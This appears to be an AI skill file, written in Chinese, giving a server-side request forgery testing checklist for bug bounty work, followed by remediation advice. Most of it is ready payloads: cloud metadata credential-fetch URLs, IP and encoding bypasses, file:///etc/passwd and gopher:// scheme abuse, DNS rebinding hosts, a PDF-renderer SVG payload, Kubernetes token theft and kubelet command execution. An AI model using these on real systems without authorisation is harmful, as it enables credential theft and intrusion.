---
name: claude-red-ssrf
description: 服务器端请求伪造(SSRF)测试方法论清单。覆盖SSRF发现、盲SSRF、云元数据端点、IP编码绕过、DNS重绑定、redirect chain、SSRF提权至RCE。当用户需要进行SSRF测试或bug bounty发现服务端请求伪造时触发。
---

# 服务器端请求伪造（SSRF）测试方法论

## 快捷流程
1. 发现易受SSRF的功能点
2. 设置回调监听器检测盲SSRF
3. 向潜在漏洞端点提供内部地址或回调监听器地址
4. 检查响应确认SSRF或检查监听器日志
5. 尝试绕过SSRF防护
6. 选择技术提权

## 发现技术

### 易受SSRF的功能
- URL输入字段：网站预览生成器、文档/图片URL导入、webhook配置
- 代理功能：web代理、内容获取器、API网关、翻译服务
- 文件处理：媒体转换工具、文档处理器、XML/JSON处理器
- 集成点：第三方服务连接、云存储集成、监控 webhook

### 测试方法
```bash
# 测试内部访问
http://localhost:port
http://127.0.0.1:port
http://0.0.0.0:port
http://internal-service.local
http://169.254.169.254/  # 云元数据

# 设置OOB检测
# Burp Collaborator
# Interactsh
# canarytokens.org
```

## 云元数据访问

### AWS
```bash
# IMDSv2（默认，需token）
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# 然后
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
X-aws-ec2-metadata-token: <TOKEN>

# IMDSv1绕过（PUT支持时）
POST /api/fetch
{
  "url": "http://169.254.169.254/latest/api/token",
  "method": "PUT",
  "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
}
```

### Azure
```bash
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
# 备用IP: http://168.63.129.16/metadata/instance
```

### GCP
```bash
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

### 其他云端点
- Alibaba Cloud: `http://100.100.100.200/latest/meta-data/`
- DigitalOcean: `http://169.254.169.254/metadata/v1.json`
- Oracle Cloud: `http://169.254.169.254/opc/v1/instance/`

## 绕过技术

### 允许列表绕过
- 开放重定向：`https://allowed-domain.com/redirect?url=http://internal-server`
- 子域名接管：控制允许域的子域
- 路径遍历：`https://allowed-domain.com@evil.com`

### 拒绝列表绕过

### IP表示法变体
```
http://127.0.0.1/          http://127.1/
http://0177.0.0.1/         http://0x7f.0.0.1/
http://2130706433/         http://[::1]/
http://[::ffff:127.0.0.1]/ http://[fe80::1%25lo0]:80
```

### URL编码技巧
```
http://127%2e0%2e0%2e1/    http://%6c%6f%63%61%6c%68%6f%73%74/
```

### 协议滥用
```
file:///etc/passwd
dict://localhost:6379/info
gopher://localhost:25/
tftp://localhost:69/
ldap://localhost:389/
```

### DNS重绑定
```bash
# 使用rbndr.us
curl http://make-1.2.3.4-127.0.0.1-rbndr.us

# 使用1u.ms
curl http://1u.ms/A-127.0.0.1:1-2
```

### IPv6变体
```
http://[::127.0.0.1]/  http://[::ffff:7f00:1]/
```

### PDF SSRF利用
```xml
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

## 常见SSRF参数
```
url, dest, redirect, uri, path, continue, window, next, data, reference,
site, html, val, validate, domain, callback, return, page, feed, host,
port, to, out, view, dir, origin, source, endpoint, proxy, fetch, img_url,
link, site_url, media_url
```

## 提权技术

### Kubernetes特定攻击面

#### Service Account Token窃取
```bash
# Kubelet API
curl http://127.0.0.1:10250/pods
curl http://127.0.0.1:10250/run/<ns>/<pod>/<container> -d "cmd=id"

# 提取service account token
curl file:///var/run/secrets/kubernetes.io/serviceaccount/token

# 使用token访问K8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

#### 服务网格元数据
```bash
# Istio/Envoy
http://127.0.0.1:15000/config_dump
http://127.0.0.1:15000/clusters
http://127.0.0.1:15000/certs

# Linkerd
http://127.0.0.1:4191/metrics

# Consul
http://127.0.0.1:8500/v1/agent/self
http://127.0.0.1:8500/v1/catalog/services
```

#### 容器运行时Socket暴露
```bash
# Docker socket
curl --unix-socket /var/run/docker.sock http://localhost/v1.40/containers/json

# containerd socket
unix:///run/containerd/containerd.sock
```

#### ECS任务元数据
```bash
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials
```

## 工具

- **Burp Suite**: Collaborator、SSRF Scanner、Param Miner、Turbo Intruder
- **SSRFmap**
- **Gopherus**
- **Interactsh**
- **Netcat / TCPDump / Wireshark**

## 修复建议

- 严格URL验证，使用允许列表
- 云资源使用预签名URL
- 出站流量沙箱代理
- 禁用不需要的URL schemes
- 阻止重定向到私网地址
- 验证后重放URL后重新验证目标
- 双阶段URL验证：先验证scheme/host，再解析验证IP/CIDR
- 阻止IMDSv2 token获取路径
- 出站过滤：阻止数据库服务器发起DNS/HTTP出站
